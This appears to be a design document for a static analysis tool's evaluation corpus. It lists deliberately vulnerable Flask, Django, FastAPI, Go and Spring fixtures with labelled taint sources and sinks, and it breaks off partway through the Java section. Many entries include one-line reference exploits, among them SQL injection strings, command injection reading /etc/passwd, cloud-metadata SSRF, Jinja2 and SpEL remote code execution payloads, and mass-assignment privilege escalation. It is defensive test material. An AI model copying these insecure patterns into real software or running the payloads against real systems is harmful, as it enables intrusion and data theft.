# Phase 30: Multi-Language Ground Truth Expansion

**Estimated effort: 80-120 ideal hours**
**Blocked by: Phase 13 (multi-language shallow support), Phase 9 (ground truth research)**
**Blocks: per-language calibration, cross-language taint validation**
**Target milestone: v1.2**

---

## 1. Overview

### 1.1 Current Bias

The eval corpus has 183 ground truth YAML entries (gt-001 through gt-144 TPs, gt-fp-001 through gt-fp-039 FPs). Approximately 80% of these target TypeScript/JavaScript (Express, Fastify, Koa, Node.js stdlib). Python, Go, and Java entries are either absent or minimal — limited to the shallow specs added in Phase 13.

This creates a measurement blind spot: Piranesi can claim TS/JS detection rates backed by real data but has no statistical basis for multi-language accuracy. Detection regressions in Python/Go/Java would go unnoticed.

### 1.2 Goal

Balanced ground truth coverage across all four supported language ecosystems (TS/JS, Python, Go, Java) plus advanced cross-cutting pattern coverage. Every supported CWE should have ground truth entries in every supported language.

### 1.3 Targets

| Category | New Entries | Numbering |
|----------|-------------|-----------|
| Python (Flask/Django/FastAPI) | 50 | gt-145 through gt-194 |
| Go (Gin/Echo/Chi/stdlib) | 40 | gt-195 through gt-234 |
| Java (Spring Boot/Servlet) | 40 | gt-235 through gt-274 |
| Advanced Patterns (cross-language) | 30 | gt-275 through gt-304 |
| New False Positives (multi-lang) | 30 | gt-fp-040 through gt-fp-069 |
| **Total** | **190** | gt-145 through gt-304, gt-fp-040 through gt-fp-069 |

Post-phase totals: 344 TP entries, 69 FP entries, 413 total.

---

## 2. Python Ground Truth (50 entries)

### 2.1 Distribution

| Framework | Entries | CWE Coverage |
|-----------|---------|--------------|
| Flask | 15 | CWE-89, CWE-79, CWE-78, CWE-94, CWE-918 |
| Django | 15 | CWE-89, CWE-79, CWE-78, CWE-22, CWE-918, CWE-352 |
| FastAPI | 10 | CWE-89, CWE-79, CWE-78, CWE-918 |
| General Python | 10 | CWE-94, CWE-502, CWE-22, CWE-78 |

### 2.2 Flask Fixtures (gt-145 through gt-159)

#### gt-145: Flask SQLi via f-string (CWE-89)

```python
# eval/fixtures/python/flask/cwe_89/sqli_fstring.py
from flask import Flask, request
import sqlite3
app = Flask(__name__)
@app.route("/user")
def get_user():
    uid = request.args.get("id")
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM users WHERE id = '{uid}'")  # sink: line 9
    return str(cur.fetchall())
```

- **taint_source**: `request.args.get("id")`
- **taint_sink**: `cur.execute()` with f-string interpolation
- **taint_path**: `request.args.get("id")` → `uid` → f-string → `cur.execute()`
- **complexity**: simple
- **reference_exploit**: `GET /user?id=' OR 1=1--` dumps all users

#### gt-146: Flask SQLi via format() (CWE-89)

```python
@app.route("/search")
def search():
    term = request.form["q"]
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM products WHERE name LIKE '%{}%'".format(term))  # sink
    return str(cur.fetchall())
```

- **taint_source**: `request.form["q"]`
- **taint_sink**: `cur.execute()` with `.format()` interpolation

#### gt-147: Flask SQLi via % formatting (CWE-89)

```python
@app.route("/order")
def order():
    order_id = request.args.get("oid")
    cur.execute("SELECT * FROM orders WHERE id = %s" % order_id)  # sink
    return str(cur.fetchone())
```

#### gt-148: Flask XSS via render_template_string (CWE-79)

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template_string(f"<h1>Hello {name}</h1>")  # sink: line 6
```

- **taint_source**: `request.args.get("name")`
- **taint_sink**: `render_template_string()` with user input in template
- **reference_exploit**: `GET /greet?name=<script>alert(1)</script>`

#### gt-149: Flask SSTI via Jinja2 Template (CWE-1336)

```python
from flask import Flask, request
from jinja2 import Template
app = Flask(__name__)
@app.route("/render")
def render():
    tmpl = request.args.get("template", "")
    return Template(tmpl).render()  # sink: line 7
```

- **taint_source**: `request.args.get("template")`
- **taint_sink**: `Template(user_input).render()`
- **complexity**: simple
- **reference_exploit**: `GET /render?template={{config.items()}}` leaks config; `{{''.__class__.__mro__[1].__subclasses__()}}` for RCE chain

#### gt-150: Flask Command Injection via subprocess (CWE-78)

```python
from flask import Flask, request
import subprocess
app = Flask(__name__)
@app.route("/ping")
def ping():
    host = request.args.get("host")
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)  # sink
    return result.stdout.decode()
```

- **taint_source**: `request.args.get("host")`
- **taint_sink**: `subprocess.run()` with `shell=True` and f-string
- **reference_exploit**: `GET /ping?host=;cat /etc/passwd`

#### gt-151: Flask Command Injection via os.system (CWE-78)

```python
import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/convert")
def convert():
    filename = request.args.get("file")
    os.system(f"convert {filename} output.png")  # sink
    return "done"
```

#### gt-152: Flask SSRF via requests (CWE-918)

```python
import requests as http_client
from flask import Flask, request
app = Flask(__name__)
@app.route("/fetch")
def fetch():
    url = request.args.get("url")
    resp = http_client.get(url)  # sink
    return resp.text
```

- **taint_source**: `request.args.get("url")`
- **taint_sink**: `requests.get(url)` with unvalidated URL
- **reference_exploit**: `GET /fetch?url=http://169.254.169.254/latest/meta-data/` (cloud metadata SSRF)

#### gt-153: Flask Code Injection via eval (CWE-94)

```python
from flask import Flask, request
app = Flask(__name__)
@app.route("/calc")
def calc():
    expr = request.args.get("expr")
    return str(eval(expr))  # sink
```

#### gt-154: Flask Path Traversal (CWE-22)

```python
from flask import Flask, request, send_file
app = Flask(__name__)
@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"/uploads/{filename}")  # sink
```

- **reference_exploit**: `GET /download?file=../../etc/passwd`

#### gt-155: Flask XSS via Markup (CWE-79)

```python
from flask import Flask, request, Markup
app = Flask(__name__)
@app.route("/comment")
def comment():
    body = request.form.get("body", "")
    return Markup(f"<div class='comment'>{body}</div>")  # sink
```

#### gt-156: Flask SQLi interprocedural (CWE-89)

```python
from flask import Flask, request
import sqlite3
app = Flask(__name__)
def build_query(table, col, val):
    return f"SELECT * FROM {table} WHERE {col} = '{val}'"  # taint preserved
@app.route("/lookup")
def lookup():
    uid = request.args.get("id")
    q = build_query("users", "id", uid)
    conn = sqlite3.connect("app.db")
    conn.cursor().execute(q)  # sink
    return "ok"
```

- **complexity**: inter

#### gt-157: Flask open redirect (CWE-601)

```python
from flask import Flask, request, redirect
app = Flask(__name__)
@app.route("/redir")
def redir():
    target = request.args.get("next")
    return redirect(target)  # sink
```

#### gt-158: Flask cookie without secure flag (CWE-614)

```python
from flask import Flask, make_response
app = Flask(__name__)
@app.route("/login")
def login():
    resp = make_response("ok")
    resp.set_cookie("session", "abc123")  # no secure=True, no httponly=True
    return resp
```

#### gt-159: Flask deserialization via pickle (CWE-502)

```python
import pickle, base64
from flask import Flask, request
app = Flask(__name__)
@app.route("/load")
def load():
    data = base64.b64decode(request.args.get("data"))
    obj = pickle.loads(data)  # sink
    return str(obj)
```

### 2.3 Django Fixtures (gt-160 through gt-174)

#### gt-160: Django ORM bypass via raw() (CWE-89)

```python
# eval/fixtures/python/django/cwe_89/raw_query.py
from django.http import JsonResponse
from myapp.models import User
def user_detail(request):
    uid = request.GET["id"]
    users = User.objects.raw(f"SELECT * FROM myapp_user WHERE id = {uid}")  # sink
    return JsonResponse({"name": users[0].name})
```

- **taint_source**: `request.GET["id"]`
- **taint_sink**: `User.objects.raw()` with f-string

#### gt-161: Django ORM bypass via extra() (CWE-89)

```python
def search(request):
    term = request.GET["q"]
    qs = User.objects.extra(where=[f"name LIKE '%%{term}%%'"])  # sink
    return JsonResponse(list(qs.values()), safe=False)
```

#### gt-162: Django cursor.execute SQLi (CWE-89)

```python
from django.db import connection
def report(request):
    start = request.GET["start"]
    end = request.GET["end"]
    with connection.cursor() as cur:
        cur.execute(f"SELECT * FROM orders WHERE date BETWEEN '{start}' AND '{end}'")  # sink
        return cur.fetchall()
```

#### gt-163: Django XSS via mark_safe (CWE-79)

```python
from django.utils.safestring import mark_safe
def profile(request):
    bio = request.POST["bio"]
    return mark_safe(f"<div>{bio}</div>")  # sink
```

#### gt-164: Django CSRF exempt view (CWE-352)

```python
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
@csrf_exempt  # disables CSRF protection
def transfer(request):
    amount = request.POST["amount"]
    to_acct = request.POST["to"]
    # ... performs bank transfer without CSRF verification
    return JsonResponse({"status": "ok"})
```

#### gt-165: Django mass assignment via ModelForm without fields (CWE-915)

```python
from django import forms
from myapp.models import User
class UserForm(forms.ModelForm):
    class Meta:
        model = User
        fields = '__all__'  # allows is_admin, is_staff to be set by attacker
def update_profile(request):
    form = UserForm(request.POST, instance=request.user)
    if form.is_valid():
        form.save()  # sink: mass assignment
```

#### gt-166: Django DEBUG=True in production (CWE-215)

```python
# settings.py
DEBUG = True  # exposes stack traces, settings, SQL queries to attackers
ALLOWED_HOSTS = ['*']
```

#### gt-167: Django command injection (CWE-78)

```python
import subprocess
def export(request):
    fmt = request.GET["format"]
    subprocess.call(f"python manage.py dumpdata --format={fmt}", shell=True)  # sink
```

#### gt-168: Django SSRF via urllib (CWE-918)

```python
import urllib.request
def proxy(request):
    url = request.GET["url"]
    resp = urllib.request.urlopen(url)  # sink
    return resp.read()
```

#### gt-169: Django path traversal (CWE-22)

```python
import os
from django.http import FileResponse
def download(request):
    name = request.GET["name"]
    path = os.path.join("/var/uploads", name)
    return FileResponse(open(path, "rb"))  # sink: no path normalization
```

#### gt-170: Django Template injection (CWE-1336)

```python
from django.template import Template, Context
def render_custom(request):
    tmpl_str = request.POST["template"]
    t = Template(tmpl_str)  # sink: user controls template
    return t.render(Context({"user": request.user}))
```

#### gt-171: Django SQL injection via RawSQL annotation (CWE-89)

```python
from django.db.models.expressions import RawSQL
def ranked(request):
    col = request.GET["sort"]
    qs = User.objects.annotate(rank=RawSQL(f"rank() OVER (ORDER BY {col})", []))  # sink
    return list(qs)
```

#### gt-172: Django open redirect (CWE-601)

```python
from django.shortcuts import redirect
def login_redirect(request):
    next_url = request.GET.get("next", "/")
    return redirect(next_url)  # sink: no validation
```

#### gt-173: Django header injection (CWE-113)

```python
from django.http import HttpResponse
def download(request):
    fname = request.GET["filename"]
    resp = HttpResponse(content_type="application/octet-stream")
    resp["Content-Disposition"] = f"attachment; filename={fname}"  # sink
    return resp
```

#### gt-174: Django deserialization (CWE-502)

```python
import yaml
def import_config(request):
    data = request.body
    config = yaml.load(data, Loader=yaml.FullLoader)  # sink: unsafe YAML load
```

### 2.4 FastAPI Fixtures (gt-175 through gt-184)

#### gt-175: FastAPI SQLi via f-string (CWE-89)

```python
# eval/fixtures/python/fastapi/cwe_89/sqli_fstring.py
from fastapi import FastAPI, Query
import sqlite3
app = FastAPI()
@app.get("/user")
def get_user(uid: str = Query(...)):
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM users WHERE id = '{uid}'")  # sink
    return {"users": cur.fetchall()}
```

- **taint_source**: `uid: str = Query(...)`
- **taint_sink**: `cur.execute()` with f-string

#### gt-176: FastAPI body injection (CWE-89)

```python
from fastapi import FastAPI, Body
import sqlite3
app = FastAPI()
@app.post("/search")
def search(term: str = Body(..., embed=True)):
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM products WHERE name LIKE '%{term}%'")  # sink
    return {"results": cur.fetchall()}
```

#### gt-177: FastAPI command injection (CWE-78)

```python
from fastapi import FastAPI, Query
import subprocess
app = FastAPI()
@app.get("/dns")
def dns_lookup(domain: str = Query(...)):
    result = subprocess.run(f"nslookup {domain}", shell=True, capture_output=True)  # sink
    return {"output": result.stdout.decode()}
```

#### gt-178: FastAPI SSRF (CWE-918)

```python
import httpx
from fastapi import FastAPI, Query
app = FastAPI()
@app.get("/proxy")
async def proxy(url: str = Query(...)):
    async with httpx.AsyncClient() as client:
        resp = await client.get(url)  # sink
    return {"body": resp.text}
```

#### gt-179: FastAPI Pydantic validation bypass (CWE-89)

```python
from fastapi import FastAPI
from pydantic import BaseModel
app = FastAPI()
class SearchReq(BaseModel):
    query: str
    class Config:
        extra = "allow"  # allows arbitrary extra fields
@app.post("/search")
def search(req: SearchReq):
    # extra fields bypass Pydantic validation
    order_by = req.__dict__.get("order_by", "id")
    cur.execute(f"SELECT * FROM items ORDER BY {order_by}")  # sink
    return {"results": cur.fetchall()}
```

- **complexity**: ctx — requires understanding that `extra = "allow"` permits unvalidated fields

#### gt-180: FastAPI XSS via HTMLResponse (CWE-79)

```python
from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
app = FastAPI()
@app.get("/page", response_class=HTMLResponse)
def page(title: str = Query("")):
    return f"<html><head><title>{title}</title></head><body>ok</body></html>"  # sink
```

#### gt-181: FastAPI path traversal (CWE-22)

```python
from fastapi import FastAPI
from fastapi.responses import FileResponse
app = FastAPI()
@app.get("/files/{filepath:path}")
def get_file(filepath: str):
    return FileResponse(f"/data/{filepath}")  # sink
```

#### gt-182: FastAPI dependency injection misuse (CWE-89)

```python
from fastapi import FastAPI, Depends, Query
import sqlite3
app = FastAPI()
def get_db():
    return sqlite3.connect("app.db")
def get_filter(q: str = Query("")):
    return f"WHERE name LIKE '%{q}%'"  # taint preserved in dependency
@app.get("/items")
def items(db=Depends(get_db), filt: str = Depends(get_filter)):
    cur = db.cursor()
    cur.execute(f"SELECT * FROM items {filt}")  # sink
    return cur.fetchall()
```

- **complexity**: inter — taint flows through FastAPI dependency injection

#### gt-183: FastAPI eval (CWE-94)

```python
from fastapi import FastAPI, Body
app = FastAPI()
@app.post("/eval")
def run_eval(code: str = Body(..., embed=True)):
    return {"result": eval(code)}  # sink
```

#### gt-184: FastAPI deserialization (CWE-502)

```python
import pickle, base64
from fastapi import FastAPI, Body
app = FastAPI()
@app.post("/deserialize")
def deserialize(payload: str = Body(..., embed=True)):
    data = base64.b64decode(payload)
    return {"obj": str(pickle.loads(data))}  # sink
```

### 2.5 General Python Fixtures (gt-185 through gt-194)

#### gt-185: Python eval() from env var (CWE-94)

```python
import os
config = eval(os.environ.get("APP_CONFIG", "{}"))  # sink: env var into eval
```

#### gt-186: Python exec() from file content (CWE-94)

```python
def run_plugin(path):
    with open(path) as f:
        exec(f.read())  # sink: arbitrary code execution
```

#### gt-187: Python pickle from network (CWE-502)

```python
import pickle, socket
def recv_obj(sock):
    data = sock.recv(4096)
    return pickle.loads(data)  # sink
```

#### gt-188: Python yaml.load unsafe (CWE-502)

```python
import yaml
def parse_config(raw_yaml: str):
    return yaml.load(raw_yaml)  # sink: default Loader allows arbitrary objects
```

#### gt-189: Python os.path.join traversal (CWE-22)

```python
import os
def read_upload(user_path: str):
    full = os.path.join("/uploads", user_path)
    # os.path.join("/uploads", "/etc/passwd") == "/etc/passwd"
    return open(full).read()  # sink
```

#### gt-190: Python shutil.copy with user path (CWE-22)

```python
import shutil
def copy_file(src: str, dst: str):
    shutil.copy(src, dst)  # sink: both args from user
```

#### gt-191: Python subprocess.Popen shell (CWE-78)

```python
import subprocess
def run_cmd(user_cmd: str):
    p = subprocess.Popen(user_cmd, shell=True, stdout=subprocess.PIPE)  # sink
    return p.communicate()[0]
```

#### gt-192: Python compile() + exec() chain (CWE-94)

```python
def run_user_code(code_str: str):
    compiled = compile(code_str, "<user>", "exec")
    exec(compiled)  # sink: two-step code execution
```

- **complexity**: inter — taint through `compile()` intermediate

#### gt-193: Python XML XXE (CWE-611)

```python
from xml.etree.ElementTree import fromstring
def parse_xml(raw: str):
    tree = fromstring(raw)  # sink: default parser allows entity expansion
    return tree.find("data").text
```

#### gt-194: Python LDAP injection (CWE-90)

```python
import ldap
def lookup_user(username: str):
    conn = ldap.initialize("ldap://dir.example.com")
    conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE,
                  f"(uid={username})")  # sink
```

### 2.6 Source Projects for Real-World Validation

| Project | URL | Expected Patterns |
|---------|-----|-------------------|
| OWASP WebGoat Python | github.com/OWASP/webgoat-python | SQLi, XSS, CMDi, SSRF |
| Damn Vulnerable Flask App (DVFA) | github.com/anil-yelken/Vulnerable-Flask-App | All Flask vuln classes |
| Django-DefectDojo | github.com/DefectDojo/django-DefectDojo | Real CVEs in Django app |
| Pygoat | github.com/adeyosemanputra/pygoat | OWASP Top 10 in Django |
| Vulnerable FastAPI | Hand-crafted synthetics | FastAPI-specific patterns |

---

## 3. Go Ground Truth (40 entries)

### 3.1 Distribution

| Framework | Entries | CWE Coverage |
|-----------|---------|--------------|
| Gin | 12 | CWE-89, CWE-79, CWE-78, CWE-22, CWE-918 |
| Echo | 10 | CWE-89, CWE-79, CWE-78, CWE-22, CWE-918 |
| Chi | 8 | CWE-89, CWE-79, CWE-22, CWE-352 |
| net/http stdlib | 10 | CWE-89, CWE-79, CWE-78, CWE-22, CWE-918, CWE-295 |

### 3.2 Gin Fixtures (gt-195 through gt-206)

#### gt-195: Gin SQLi via string concat (CWE-89)

```go
// eval/fixtures/go/gin/cwe_89/sqli_concat.go
package main
import (
    "database/sql"
    "github.com/gin-gonic/gin"
    _ "github.com/mattn/go-sqlite3"
)
func main() {
    db, _ := sql.Open("sqlite3", "app.db")
    r := gin.Default()
    r.GET("/user", func(c *gin.Context) {
        id := c.Query("id")
        row := db.QueryRow("SELECT name FROM users WHERE id = '" + id + "'") // sink: line 13
        var name string
        row.Scan(&name)
        c.JSON(200, gin.H{"name": name})
    })
    r.Run(":8080")
}
```

- **taint_source**: `c.Query("id")`
- **taint_sink**: `db.QueryRow()` with string concatenation
- **reference_exploit**: `GET /user?id=' UNION SELECT password FROM users--`

#### gt-196: Gin SQLi via fmt.Sprintf (CWE-89)

```go
r.GET("/search", func(c *gin.Context) {
    term := c.Query("q")
    q := fmt.Sprintf("SELECT * FROM products WHERE name LIKE '%%%s%%'", term)
    rows, _ := db.Query(q) // sink
    // ...
})
```

#### gt-197: Gin XSS via direct write (CWE-79)

```go
r.GET("/greet", func(c *gin.Context) {
    name := c.Query("name")
    c.Writer.Write([]byte("<h1>Hello " + name + "</h1>")) // sink
})
```

- **taint_source**: `c.Query("name")`
- **taint_sink**: `c.Writer.Write()` with unescaped HTML
- **reference_exploit**: `GET /greet?name=<script>alert(1)</script>`

#### gt-198: Gin XSS via c.Data (CWE-79)

```go
r.GET("/preview", func(c *gin.Context) {
    html := c.Query("html")
    c.Data(200, "text/html; charset=utf-8", []byte(html)) // sink
})
```

#### gt-199: Gin path traversal via c.File (CWE-22)

```go
r.GET("/static/:filepath", func(c *gin.Context) {
    fp := c.Param("filepath")
    c.File("/var/www/static/" + fp) // sink
})
```

- **reference_exploit**: `GET /static/../../etc/passwd`

#### gt-200: Gin command injection (CWE-78)

```go
r.GET("/ping", func(c *gin.Context) {
    host := c.Query("host")
    out, _ := exec.Command("sh", "-c", "ping -c 1 "+host).Output() // sink
    c.String(200, string(out))
})
```

#### gt-201: Gin SSRF (CWE-918)

```go
r.GET("/fetch", func(c *gin.Context) {
    url := c.Query("url")
    resp, _ := http.Get(url) // sink
    body, _ := io.ReadAll(resp.Body)
    c.Data(200, resp.Header.Get("Content-Type"), body)
})
```

#### gt-202: Gin header injection (CWE-113)

```go
r.GET("/download", func(c *gin.Context) {
    fname := c.Query("filename")
    c.Header("Content-Disposition", "attachment; filename="+fname) // sink
    c.File("/uploads/" + fname)
})
```

#### gt-203: Gin open redirect (CWE-601)

```go
r.GET("/redirect", func(c *gin.Context) {
    target := c.Query("url")
    c.Redirect(302, target) // sink
})
```

#### gt-204: Gin SQLi interprocedural (CWE-89)

```go
func buildQuery(table, col, val string) string {
    return fmt.Sprintf("SELECT * FROM %s WHERE %s = '%s'", table, col, val) // taint preserved
}
r.GET("/lookup", func(c *gin.Context) {
    id := c.Query("id")
    q := buildQuery("users", "id", id)
    db.QueryRow(q) // sink
})
```

- **complexity**: inter

#### gt-205: Gin template injection (CWE-1336)

```go
r.GET("/render", func(c *gin.Context) {
    tmpl := c.Query("tmpl")
    t, _ := template.New("t").Parse(tmpl) // sink: user controls template
    t.Execute(c.Writer, nil)
})
```

#### gt-206: Gin deserialization via gob (CWE-502)

```go
r.POST("/import", func(c *gin.Context) {
    dec := gob.NewDecoder(c.Request.Body)
    var obj interface{}
    dec.Decode(&obj) // sink: deserializing untrusted body
    c.JSON(200, obj)
})
```

### 3.3 Echo Fixtures (gt-207 through gt-216)

#### gt-207: Echo SQLi (CWE-89)

```go
e.GET("/user", func(c echo.Context) error {
    id := c.QueryParam("id")
    row := db.QueryRow("SELECT name FROM users WHERE id = '" + id + "'") // sink
    var name string
    row.Scan(&name)
    return c.JSON(200, map[string]string{"name": name})
})
```

#### gt-208: Echo XSS via c.HTML (CWE-79)

```go
e.GET("/page", func(c echo.Context) error {
    title := c.QueryParam("title")
    return c.HTML(200, "<html><title>"+title+"</title></html>") // sink
})
```

#### gt-209: Echo command injection (CWE-78)

```go
e.GET("/exec", func(c echo.Context) error {
    cmd := c.QueryParam("cmd")
    out, _ := exec.Command("sh", "-c", cmd).Output() // sink
    return c.String(200, string(out))
})
```

#### gt-210: Echo SSRF (CWE-918)

```go
e.GET("/proxy", func(c echo.Context) error {
    url := c.QueryParam("url")
    resp, _ := http.Get(url) // sink
    body, _ := io.ReadAll(resp.Body)
    return c.Blob(200, resp.Header.Get("Content-Type"), body)
})
```

#### gt-211: Echo path traversal (CWE-22)

```go
e.GET("/files/:name", func(c echo.Context) error {
    name := c.Param("name")
    return c.File("/uploads/" + name) // sink
})
```

#### gt-212: Echo SQLi via Exec (CWE-89)

```go
e.POST("/delete", func(c echo.Context) error {
    id := c.FormValue("id")
    db.Exec("DELETE FROM items WHERE id = " + id) // sink
    return c.NoContent(204)
})
```

#### gt-213: Echo open redirect (CWE-601)

```go
e.GET("/goto", func(c echo.Context) error {
    return c.Redirect(302, c.QueryParam("target")) // sink
})
```

#### gt-214: Echo header injection (CWE-113)

```go
e.GET("/dl", func(c echo.Context) error {
    fname := c.QueryParam("file")
    c.Response().Header().Set("Content-Disposition", "attachment; filename="+fname) // sink
    return c.File("/data/" + fname)
})
```

#### gt-215: Echo XSS interprocedural (CWE-79)

```go
func renderBanner(name string) string {
    return "<div class='banner'>Welcome " + name + "</div>" // taint preserved
}
e.GET("/welcome", func(c echo.Context) error {
    name := c.QueryParam("name")
    html := renderBanner(name)
    return c.HTML(200, html) // sink
})
```

- **complexity**: inter

#### gt-216: Echo JSON hijacking via JSONP (CWE-79)

```go
e.GET("/api/data", func(c echo.Context) error {
    callback := c.QueryParam("callback")
    data := `{"secret":"value"}`
    return c.String(200, callback+"("+data+")") // sink: JSONP with unvalidated callback
})
```

### 3.4 Chi Fixtures (gt-217 through gt-224)

#### gt-217: Chi SQLi (CWE-89)

```go
r.Get("/user/{id}", func(w http.ResponseWriter, r *http.Request) {
    id := chi.URLParam(r, "id")
    row := db.QueryRow("SELECT name FROM users WHERE id = '" + id + "'") // sink
    // ...
})
```

#### gt-218: Chi XSS (CWE-79)

```go
r.Get("/search", func(w http.ResponseWriter, r *http.Request) {
    q := r.URL.Query().Get("q")
    fmt.Fprintf(w, "<p>Results for: %s</p>", q) // sink
})
```

#### gt-219: Chi path traversal (CWE-22)

```go
r.Get("/files/*", func(w http.ResponseWriter, r *http.Request) {
    path := chi.URLParam(r, "*")
    http.ServeFile(w, r, "/var/data/"+path) // sink
})
```

#### gt-220: Chi middleware bypass (CWE-285)

```go
r := chi.NewRouter()
r.Group(func(r chi.Router) {
    r.Use(authMiddleware) // applied to group
    r.Get("/admin/dashboard", adminHandler)
})
r.Get("/admin/export", exportHandler) // outside group — no auth middleware
```

- **complexity**: ctx — requires understanding that route is outside the middleware group

#### gt-221: Chi CSRF missing (CWE-352)

```go
r := chi.NewRouter()
// no CSRF middleware registered
r.Post("/transfer", func(w http.ResponseWriter, r *http.Request) {
    amount := r.FormValue("amount")
    // performs state-changing operation without CSRF token
})
```

#### gt-222: Chi SSRF (CWE-918)

```go
r.Get("/fetch", func(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    resp, _ := http.Get(url) // sink
    io.Copy(w, resp.Body)
})
```

#### gt-223: Chi command injection (CWE-78)

```go
r.Get("/run", func(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    out, _ := exec.Command("bash", "-c", cmd).Output() // sink
    w.Write(out)
})
```

#### gt-224: Chi SQLi interprocedural (CWE-89)

```go
func getUserQuery(id string) string {
    return "SELECT * FROM users WHERE id = '" + id + "'" // taint preserved
}
r.Get("/user", func(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    q := getUserQuery(id)
    db.QueryRow(q) // sink
})
```

- **complexity**: inter

### 3.5 net/http stdlib Fixtures (gt-225 through gt-234)

#### gt-225: stdlib SQLi (CWE-89)

```go
http.HandleFunc("/user", func(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")
    db.QueryRow("SELECT * FROM users WHERE id = " + id) // sink
})
```

#### gt-226: stdlib XSS (CWE-79)

```go
http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("name")
    fmt.Fprintf(w, "<h1>Hello %s</h1>", name) // sink
})
```

#### gt-227: stdlib command injection (CWE-78)

```go
http.HandleFunc("/exec", func(w http.ResponseWriter, r *http.Request) {
    cmd := r.FormValue("cmd")
    out, _ := exec.Command("sh", "-c", cmd).Output() // sink
    w.Write(out)
})
```

#### gt-228: stdlib path traversal (CWE-22)

```go
http.HandleFunc("/file", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    data, _ := os.ReadFile("/data/" + name) // sink
    w.Write(data)
})
```

#### gt-229: stdlib SSRF (CWE-918)

```go
http.HandleFunc("/proxy", func(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    resp, _ := http.Get(url) // sink
    io.Copy(w, resp.Body)
})
```

#### gt-230: stdlib open redirect (CWE-601)

```go
http.HandleFunc("/redir", func(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("next")
    http.Redirect(w, r, target, 302) // sink
})
```

#### gt-231: stdlib TLS skip verify (CWE-295)

```go
client := &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // vuln
    },
}
```

#### gt-232: stdlib template injection (CWE-1336)

```go
http.HandleFunc("/render", func(w http.ResponseWriter, r *http.Request) {
    tmpl := r.FormValue("tmpl")
    t, _ := template.New("t").Parse(tmpl) // sink: user controls template
    t.Execute(w, nil)
})
```

#### gt-233: stdlib SQL injection via Exec (CWE-89)

```go
http.HandleFunc("/delete", func(w http.ResponseWriter, r *http.Request) {
    id := r.FormValue("id")
    db.Exec("DELETE FROM items WHERE id = " + id) // sink
})
```

#### gt-234: stdlib header injection (CWE-113)

```go
http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
    fname := r.URL.Query().Get("file")
    w.Header().Set("Content-Disposition", "attachment; filename="+fname) // sink
})
```

### 3.6 Source Projects for Real-World Go Validation

| Project | URL | Expected Patterns |
|---------|-----|-------------------|
| OWASP Go test suite | github.com/OWASP/Go-SCP | Go secure coding patterns |
| Go-SCA | github.com/AkihiroSuda/go-sca | Static analysis test cases |
| Gorilla Toolkit CVEs | github.com/gorilla | Session/mux vulnerabilities |
| Vulnerable Go App | Hand-crafted synthetics | Framework-specific patterns |

---

## 4. Java/Spring Ground Truth (40 entries)

### 4.1 Distribution

| Framework | Entries | CWE Coverage |
|-----------|---------|--------------|
| Spring Boot | 20 | CWE-89, CWE-79, CWE-78, CWE-917, CWE-918, CWE-502, CWE-915 |
| Servlet | 10 | CWE-89, CWE-79, CWE-78, CWE-22, CWE-918 |
| General Java | 10 | CWE-502, CWE-611, CWE-94, CWE-295, CWE-327 |

### 4.2 Spring Boot Fixtures (gt-235 through gt-254)

#### gt-235: Spring JdbcTemplate SQLi (CWE-89)

```java
// eval/fixtures/java/spring/cwe_89/JdbcSqli.java
@RestController
public class UserController {
    @Autowired JdbcTemplate jdbc;
    @GetMapping("/user")
    public Map<String, Object> getUser(@RequestParam String id) {
        String sql = "SELECT * FROM users WHERE id = '" + id + "'"; // taint preserved
        return jdbc.queryForMap(sql); // sink: line 7
    }
}
```

- **taint_source**: `@RequestParam String id`
- **taint_sink**: `jdbc.queryForMap()` with string concatenation
- **reference_exploit**: `GET /user?id=' UNION SELECT password FROM users--`

#### gt-236: Spring JdbcTemplate SQLi via String.format (CWE-89)

```java
@GetMapping("/search")
public List<Map<String, Object>> search(@RequestParam String q) {
    String sql = String.format("SELECT * FROM products WHERE name LIKE '%%%s%%'", q);
    return jdbc.queryForList(sql); // sink
}
```

#### gt-237: Spring SpEL injection (CWE-917)

```java
@RestController
public class CalcController {
    @GetMapping("/calc")
    public Object calc(@RequestParam String expr) {
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(expr).getValue(); // sink
    }
}
```

- **taint_source**: `@RequestParam String expr`
- **taint_sink**: `parser.parseExpression(user_input).getValue()`
- **reference_exploit**: `GET /calc?expr=T(java.lang.Runtime).getRuntime().exec('id')` — RCE via SpEL

#### gt-238: Spring mass assignment via @RequestBody (CWE-915)

```java
@Entity
public class User {
    @Id private Long id;
    private String name;
    private String email;
    private boolean admin; // should not be settable by user
}

@RestController
public class UserController {
    @Autowired UserRepository repo;
    @PutMapping("/profile")
    public User updateProfile(@RequestBody User user) {
        return repo.save(user); // sink: all fields bound including admin
    }
}
```

- **reference_exploit**: `PUT /profile {"name":"attacker","admin":true}` — privilege escalation

#### gt-239: Spring SSRF via RestTemplate (CWE-918)

```java
@RestController
public class ProxyController {
    @Autowired RestTemplate rest;
    @GetMapping("/fetch")
    public String fetch(@RequestParam String url) {
        return rest.getForObject(url, String.class); // sink
    }
}
```

- **reference_exploit**: `GET /fetch?url=http://169.254.169.254/latest/meta-data/`

